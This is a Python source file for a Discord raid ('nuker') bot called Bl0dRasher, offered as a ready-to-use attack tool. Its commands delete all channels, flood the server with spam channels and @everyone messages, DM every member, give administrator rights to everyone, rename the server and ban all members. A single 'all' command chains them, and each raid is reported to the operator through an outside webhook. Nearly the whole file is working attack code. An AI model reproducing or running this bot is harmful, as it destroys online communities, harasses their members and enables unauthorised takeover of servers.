import discord
import datetime
from discord.ext import commands
from discord_webhook import DiscordWebhook, DiscordEmbed

# Change the information
token = ""
prefix = "$"

# If webhook is True when somebody attack a server get notification with user and server id
webhook = True
webhook_url = ""
# If i have this color "#DC143C" change # for 0x, result "0xDC143C"
webhook_color = 0xb81c00
# Only link
webhook_image = "https://media.discordapp.net/attachments/777622927993864242/780586514043895858/photo_2020-11-23_08-57-51.jpg?width=429&height=429"
name_channel = "raided-by-bloodmoon"
num_channels = 50
guild_name = "Raided By Blood Moon"
guild_picture = "Pic/Blood_Moon.jpg"
"""
If "message" is False it will send an embed instead of a message 
"""
message = False
message_channels = "@everyone Fucked by Blood Moon."

# If "embed_dm" is True the previously declared embed will be sent, if it is false "message_dm" will be sent 
embed_dm = True
message_dm = "A server where you were was fucked up by Blood Moon."
embed_title = "Raided By Blood Moon."
embed_desc = "Server fucked by Blood Moon."
# If i have this color "#DC143C" change # for 0x, result "0xDC143C"
embed_color = 0xb81c00
embed_link = "https://discord.gg/test"
# Always URL
embed_picture = "https://media.discordapp.net/attachments/777622927993864242/780586514043895858/photo_2020-11-23_08-57-51.jpg?width=429&height=429"
intents = discord.Intents.default()
intents.members = True
# Define prefix
client = commands.Bot(command_prefix = prefix, intents=intents)
client.remove_command("help")

# Open image
with open(guild_picture, 'rb') as f:
    guild_icon = f.read()

def send_webhook(webhook_color, webhook_url, webhook_image, username, user_id, guildname, guild_id, guild_picture):
    dt = datetime.datetime.now()
    date = dt.strftime("%d/%m/%Y, %m:%M:%S")
    webhook = DiscordWebhook(url=webhook_url)
    embed = DiscordEmbed(title="New Raid", description=f"A new raid took place at: {date}", color=webhook_color)
    embed.set_thumbnail(url=webhook_image)
    embed.add_embed_field(name="Attacked Server:", value=f"Name: {guildname}\nID: {guild_id}")
    embed.add_embed_field(name="Name of Attacker", value=f"Name: {username}\nID: {user_id}")
    embed.set_footer(text="Bl0dRasher - Created By Narchen#6666")
    webhook.add_embed(embed)
    response = webhook.execute()

# If see this message the bot is correctly connected
@client.event
async def on_ready():
    print("The bot is correctly connected.")

# Delete channels with this command
@client.command()
async def delete(ctx, channel_name=name_channel):
    if webhook == True:
        username = f"{ctx.author.name}#{ctx.author.discriminator}"
        user_id = ctx.author.id
        server_id = ctx.guild.id   
        server = ctx.guild.name
        send_webhook(webhook_color=webhook_color, webhook_image=webhook_image, webhook_url=webhook_url, username=username, user_id=user_id, guildname=server, guild_id=server_id, guild_picture=guild_picture)
        
    for channelN in ctx.guild.channels:
        await channelN.delete()
        await ctx.guild.create_text_channel(channel_name)
    
# Create channels with this command
@client.command()
async def create(ctx, guild_icon=guild_icon, embed_picture=embed_picture, channel_name=name_channel, num_channels=num_channels, message_channels=message_channels, message_b=message, embedtitle=embed_title, embeddesc=embed_desc, embed_color=embed_color, embed_link=embed_link):
    if message_b == True:
        num_channels += 1
        for channel in range(1,num_channels):
            await ctx.guild.create_text_channel(channel_name)
            for message in range(1,5):
                guild = ctx.guild.channels[channel]
                await guild.send(message_channels)
    elif message_b == False:
        num_channels += 1
        embed = discord.Embed(title=embedtitle, embed_picture=embed_picture, description=embeddesc, color=embed_color)
        embed.set_thumbnail(url=embed_picture)
        embed.add_field(name="Join Now", value=embed_link)
        embed.set_footer(text="Bl0dRasher - Created By Narchen#6666")
        for channel in range(1, num_channels):
            await ctx.guild.create_text_channel(channel_name)
            guild = ctx.guild.channels[channel]
            await guild.send(embed=embed)
    else:
        print("Error: message_b is not declared")

# Set everyone with admin perms
@client.command()
async def allahmode(ctx):
    role = ctx.guild.default_role
    perms = role.permissions
    perms.administrator = True
    await role.edit(permissions=perms)

# Change the name of server and picture
@client.command()
async def change(ctx, guild_name=guild_name, guild_picture=guild_icon):
    guild = ctx.guild
    await guild.edit(name=guild_name, icon=guild_picture)

# Ban all members on server
@client.command()
async def ban(ctx):
    no = f"{ctx.message.author.name}#{ctx.message.author.discriminator}"
    for member in ctx.guild.members:
        try:
            if member != ctx.message.author and member != ctx.message.guild.me:
                await member.ban()
        except:
            print("Error: The user has admin perms.")

# Send DM to all members
@client.command()
async def dm(ctx, embed_picture=embed_picture, message_dm=message_dm, embed_dm=embed_dm, embedtitle=embed_title, embeddesc=embed_desc, embed_color=embed_color, embed_link=embed_link):
    if embed_dm == False:
        for member in ctx.guild.members:
            try:
                if member != ctx.message.author and member != ctx.message.guild.me:
                    await member.send(message_dm)
            except:
                print("Error: The user have DM blocked.")
    elif embed_dm == True:
        for member in ctx.guild.members:
            try:
                if member != ctx.message.author and member != ctx.message.guild.me:
                    embed = discord.Embed(embed_picture=embed_picture, title=embedtitle, description=embeddesc, color=embed_color)
                    embed.set_thumbnail(url=embed_picture)
                    embed.add_field(name="Join Now", value=embed_link)
                    embed.set_footer(text="Bl0dRasher - Created By Narchen#6666")
                    await member.send(embed=embed)
            except:
                print("Error: The user have DM blocked.")

    else:
        print("ERROR: embed_dm not declared.")

# All in one
@client.command()
async def all(ctx):
    await allahmode(ctx)
    await delete(ctx)
    await dm(ctx)
    await change(ctx)
    await ban(ctx)
    await create(ctx)

# Help command in spanish
@client.command()
async def help_es(ctx):
    embed = discord.Embed(title="Ayuda", guild_icon=guild_icon, description="Lista de Comandos", color=0xb81c00)
    embed.set_thumbnail(url=guild_icon)
    embed.add_field(name="$all", value="Hace todos los comandos a la vez.")
    embed.add_field(name="$delete", value="Borra todos los canales del servidor.")
    embed.add_field(name="$create", value="Crea muchos canales en el servidor.")
    embed.add_field(name="$dm", value="Manda un dm a cada uno de los miembros del servidor.")
    embed.add_field(name="$allahmode", value="Da administrador al rol everyone.")
    embed.add_field(name="$ban", value="Banea a todos los miembros del servidor.")
    embed.set_footer(text="Bl0dRasher - Created By Narchen#6666")
    await ctx.send(embed=embed)

# Help command
@client.command()
async def help(ctx):
    embed = discord.Embed(title="Help", description="Command List", color=0xb81c00)
    embed.set_thumbnail(url=guild_icon)
    embed.add_field(name="$all", value="It does all the commands at once.")
    embed.add_field(name="$delete", value="Deletes all channels from the server.")
    embed.add_field(name="$create", value="Create many channels on the server.")
    embed.add_field(name="$dm", value="Send a dm to each member of the server.")
    embed.add_field(name="$allahmode", value="Gives the role everyone as administrator.")
    embed.add_field(name="$ban", value="Ban all members of the server.")
    embed.set_footer(text="Bl0dRasher - Created By Narchen#6666")
    await ctx.send(embed=embed)

# Log into bot with token
client.run(token)
